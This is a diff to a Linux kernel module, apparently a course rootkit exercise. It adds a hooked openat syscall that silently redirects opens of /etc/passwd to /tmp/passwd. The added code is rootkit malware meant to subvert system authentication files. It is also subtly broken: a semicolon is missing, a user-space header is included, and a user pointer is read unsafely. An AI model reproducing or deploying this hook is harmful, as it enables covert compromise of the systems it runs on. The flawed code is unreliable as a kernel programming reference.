@@ -9,7 +9,8 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <linux/moduleparam.h>
-// #include <linux/sched.h>
+#include <string.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -37,6 +38,7 @@ int disable_page_rw(void *ptr){
   return 0;
 }
 
+
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
 //    should expect it find its arguments on the stack (not in registers).
@@ -45,7 +47,12 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
+  char * pathname = (char *)regs->si;
+  char * change = "/tmp/passwd"
   // Implement the sneaky part here
+  if(strcmp(pathname,"/etc/passwd") == 0){
+    copy_to_user((void *)pathname, change, strlen(change));
+  }
   return (*original_openat)(regs);
 }
 
